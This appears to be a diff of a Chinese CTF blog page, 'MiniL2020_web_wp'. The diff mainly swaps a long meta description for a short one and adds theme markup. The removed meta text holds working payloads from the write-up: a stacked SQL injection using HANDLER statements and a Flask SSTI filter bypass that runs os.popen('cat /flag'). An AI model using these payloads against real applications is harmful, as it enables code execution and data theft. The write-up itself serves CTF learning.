@@ -1,68 +1,18 @@
 <!DOCTYPE html>
 <html lang="en-us">
     <head><meta charset='utf-8'>
-<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='西电校赛，难度适中，本人内鬼选手，看了下题。
- id_wife 考点：堆叠注入
-不是很难，最开始没想到堆叠，跑去盲注，差点怀疑人生
-测出来堆叠之后就简单了，其他过滤什么我不知道，直接参考新春战疫的一道sqli，Handler一把梭
-frank&#39;);handler `1145141919810` open;handler `1145141919810` read first;handler `1145141919810` read next;#minil{4cc5cda6-30c6-48ff-ab4e-9c2830005191}
-Personal_IP_Query 考察：flaskSSTI，绕过下划线、单双引号。
-学习链接
-&amp;gt;&amp;gt;flag0师傅
-&amp;gt;&amp;gt;byc_404师傅
-打开题目，显示Your Ip IS……马上想到XFF头，伪造之后发现输入的XFF头显示出来了，然后踌躇了一阵子，回头看响应包，响应头里面有一个SERVER提示这个是python的后端，那么就尝试SSTI
-输入 {{2&#43;2}} 之后回显的 4 实锤。
-Fuzz，过滤了下划线、单双引号、没有过滤中括号
-最开始我用的是[request.value.class]那个，后来试了半天不能绕过中括号里还有引号的，后来队友改用attr(request.args.class)秒出
-在class中寻找模块exp：
-#python 3import restr = &#39;&#39;&#39;（回显信息）&#39;&#39;&#39;list = re.split(&#39;,&#39;, str)for i in range(0, len(list)):if &#39;catch_warnings&#39; in list[i]:print(i)breakplayload：
-?x1=__class__&amp;amp;x2=__base__&amp;amp;x3=__subclasses__&amp;amp;x4=__getitem__&amp;amp;x5=__init__&amp;amp;x6=__globals__&amp;amp;x7=__builtins__&amp;amp;x8=eval&amp;amp;x9=__import__(&amp;quot;os&amp;quot;).popen(&#39;cat&#43;/flag&#39;).read()X-Forwarded-For:{{()|attr(request.args.x1)|attr(request.args.x2)|attr(request.args.x3)()|attr(request.args.x4)(174)|attr(request.args.x5)|attr(request.args.x6)|attr(request.args.x4)(request.args.x7)|attr(request.args.x4)(request.args.x8)(request.args.x9)}}复现时补充：
-我的原来那个中括号的做法时走得通的，然后os模块也可以的，只是当时可能由于某些玄学原因没成功，这里补上：
-XFF：{{ [][request.args.class][request.args.mro][1][request.args.subclasses]()[127] }}//回显：Your IP: &amp;lt;class &#39;os.'><title>MiniL2020_web_wp</title>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='西电校赛'><title>MiniL2020_web_wp</title>
 
 <link rel='canonical' href='https://anthem-whisper.github.io/p/minil2020_web_wp/'>
 
 <link rel="stylesheet" href="/scss/style.min.css"><meta property='og:title' content='MiniL2020_web_wp'>
-<meta property='og:description' content='西电校赛，难度适中，本人内鬼选手，看了下题。
- id_wife 考点：堆叠注入
-不是很难，最开始没想到堆叠，跑去盲注，差点怀疑人生
-测出来堆叠之后就简单了，其他过滤什么我不知道，直接参考新春战疫的一道sqli，Handler一把梭
-frank&#39;);handler `1145141919810` open;handler `1145141919810` read first;handler `1145141919810` read next;#minil{4cc5cda6-30c6-48ff-ab4e-9c2830005191}
-Personal_IP_Query 考察：flaskSSTI，绕过下划线、单双引号。
-学习链接
-&amp;gt;&amp;gt;flag0师傅
-&amp;gt;&amp;gt;byc_404师傅
-打开题目，显示Your Ip IS……马上想到XFF头，伪造之后发现输入的XFF头显示出来了，然后踌躇了一阵子，回头看响应包，响应头里面有一个SERVER提示这个是python的后端，那么就尝试SSTI
-输入 {{2&#43;2}} 之后回显的 4 实锤。
-Fuzz，过滤了下划线、单双引号、没有过滤中括号
-最开始我用的是[request.value.class]那个，后来试了半天不能绕过中括号里还有引号的，后来队友改用attr(request.args.class)秒出
-在class中寻找模块exp：
-#python 3import restr = &#39;&#39;&#39;（回显信息）&#39;&#39;&#39;list = re.split(&#39;,&#39;, str)for i in range(0, len(list)):if &#39;catch_warnings&#39; in list[i]:print(i)breakplayload：
-?x1=__class__&amp;amp;x2=__base__&amp;amp;x3=__subclasses__&amp;amp;x4=__getitem__&amp;amp;x5=__init__&amp;amp;x6=__globals__&amp;amp;x7=__builtins__&amp;amp;x8=eval&amp;amp;x9=__import__(&amp;quot;os&amp;quot;).popen(&#39;cat&#43;/flag&#39;).read()X-Forwarded-For:{{()|attr(request.args.x1)|attr(request.args.x2)|attr(request.args.x3)()|attr(request.args.x4)(174)|attr(request.args.x5)|attr(request.args.x6)|attr(request.args.x4)(request.args.x7)|attr(request.args.x4)(request.args.x8)(request.args.x9)}}复现时补充：
-我的原来那个中括号的做法时走得通的，然后os模块也可以的，只是当时可能由于某些玄学原因没成功，这里补上：
-XFF：{{ [][request.args.class][request.args.mro][1][request.args.subclasses]()[127] }}//回显：Your IP: &amp;lt;class &#39;os.'>
+<meta property='og:description' content='西电校赛'>
 <meta property='og:url' content='https://anthem-whisper.github.io/p/minil2020_web_wp/'>
 <meta property='og:site_name' content='wh1sper'>
-<meta property='og:type' content='article'><meta property='article:section' content='Post' />
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='堆叠注入' /><meta property='article:tag' content='SSTI' /><meta property='article:tag' content='PHP反序列化' /><meta property='article:tag' content='无参数RCE' /><meta property='article:tag' content='RCE bypass' /><meta property='article:tag' content='WebDav' /><meta property='article:published_time' content='2020-05-10T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2020-05-10T00:00:00&#43;00:00'/><meta property='og:image' content='https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120170521.png' />
 <meta name="twitter:title" content="MiniL2020_web_wp">
-<meta name="twitter:description" content="西电校赛，难度适中，本人内鬼选手，看了下题。
- id_wife 考点：堆叠注入
-不是很难，最开始没想到堆叠，跑去盲注，差点怀疑人生
-测出来堆叠之后就简单了，其他过滤什么我不知道，直接参考新春战疫的一道sqli，Handler一把梭
-frank&#39;);handler `1145141919810` open;handler `1145141919810` read first;handler `1145141919810` read next;#minil{4cc5cda6-30c6-48ff-ab4e-9c2830005191}
-Personal_IP_Query 考察：flaskSSTI，绕过下划线、单双引号。
-学习链接
-&amp;gt;&amp;gt;flag0师傅
-&amp;gt;&amp;gt;byc_404师傅
-打开题目，显示Your Ip IS……马上想到XFF头，伪造之后发现输入的XFF头显示出来了，然后踌躇了一阵子，回头看响应包，响应头里面有一个SERVER提示这个是python的后端，那么就尝试SSTI
-输入 {{2&#43;2}} 之后回显的 4 实锤。
-Fuzz，过滤了下划线、单双引号、没有过滤中括号
-最开始我用的是[request.value.class]那个，后来试了半天不能绕过中括号里还有引号的，后来队友改用attr(request.args.class)秒出
-在class中寻找模块exp：
-#python 3import restr = &#39;&#39;&#39;（回显信息）&#39;&#39;&#39;list = re.split(&#39;,&#39;, str)for i in range(0, len(list)):if &#39;catch_warnings&#39; in list[i]:print(i)breakplayload：
-?x1=__class__&amp;amp;x2=__base__&amp;amp;x3=__subclasses__&amp;amp;x4=__getitem__&amp;amp;x5=__init__&amp;amp;x6=__globals__&amp;amp;x7=__builtins__&amp;amp;x8=eval&amp;amp;x9=__import__(&amp;quot;os&amp;quot;).popen(&#39;cat&#43;/flag&#39;).read()X-Forwarded-For:{{()|attr(request.args.x1)|attr(request.args.x2)|attr(request.args.x3)()|attr(request.args.x4)(174)|attr(request.args.x5)|attr(request.args.x6)|attr(request.args.x4)(request.args.x7)|attr(request.args.x4)(request.args.x8)(request.args.x9)}}复现时补充：
-我的原来那个中括号的做法时走得通的，然后os模块也可以的，只是当时可能由于某些玄学原因没成功，这里补上：
-XFF：{{ [][request.args.class][request.args.mro][1][request.args.subclasses]()[127] }}//回显：Your IP: &amp;lt;class &#39;os.">
+<meta name="twitter:description" content="西电校赛"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120170521.png' />
     </head>
     <body class="">
     <script>
@@ -232,22 +182,51 @@ XFF：{{ [][request.args.class][request.args.mro][1][request.args.subclasses]()[
         </a>
     </div>
 
-    <article class="main-article">
+    <article class="has-image main-article">
     <header class="article-header">
+        <div class="article-image">
+            <a href="/p/minil2020_web_wp/">
+                
+                    <img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120170521.png" loading="lazy" alt="Featured image of post MiniL2020_web_wp" />
+                
+            </a>
+        </div>
+    
 
     <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/ctf_writeup/" style="background-color: #2a9d8f; color: #fff;">
+                CTF writeup
+            </a>
+        
+    </header>
     
 
     <h2 class="article-title">
         <a href="/p/minil2020_web_wp/">MiniL2020_web_wp</a>
     </h2>
 
-    </div>
+    
+    <h3 class="article-subtitle">
+        西电校赛
+    </h3>
+    <footer class="article-time">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+        <time class="article-time--published">May 10, 2020</time>
+    </footer></div>
 </header>
 
     <section class="article-content">
-    <p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120170521.png" alt=""  /></p>
-<p>西电校赛，难度适中，本人内鬼选手，看了下题。</p>
+    <p>西电校赛，难度适中，本人内鬼选手，看了下题。</p>
 <hr>
 <h3 id="id_wife">id_wife</h3>
 <p>考点：堆叠注入</p>
@@ -518,6 +497,22 @@ print(a.text)
 
     <footer class="article-footer">
     
+    <section class="article-tags">
+        
+            <a href="/tags/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/">堆叠注入</a>
+        
+            <a href="/tags/ssti/">SSTI</a>
+        
+            <a href="/tags/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">PHP反序列化</a>
+        
+            <a href="/tags/%E6%97%A0%E5%8F%82%E6%95%B0rce/">无参数RCE</a>
+        
+            <a href="/tags/rce-bypass/">RCE bypass</a>
+        
+            <a href="/tags/webdav/">WebDav</a>
+        
+    </section>
+
 
     
     <section class="article-copyright">
@@ -538,6 +533,85 @@ print(a.text)
 
     <aside class="related-contents--wrapper">
     
+    
+        <h2 class="section-title">相关文章</h2>
+        <div class="related-contents">
+            <div class="flex article-list--tile">
+                
+                    
+<article class="">
+    <a href="/p/n1ctf2020/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">N1CTF2020</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="has-image">
+    <a href="/p/buuoj%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%953/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120170627.png" loading="lazy" data-key="" data-hash="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120170627.png"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">BUUOJ刷题记录(3)</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="">
+    <a href="/p/dasctf2020.6%E6%9C%88%E8%B5%9B/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">DASCTF2020.6月赛</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="">
+    <a href="/p/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">“第五空间”智能安全大赛</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="has-image">
+    <a href="/p/whuctf2020/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120170745.jpeg" loading="lazy" data-key="" data-hash="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120170745.jpeg"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">WHUCTF2020</h2>
+        </div>
+    </a>
+</article>
+                
+            </div>
+        </div>
     
 </aside>
 
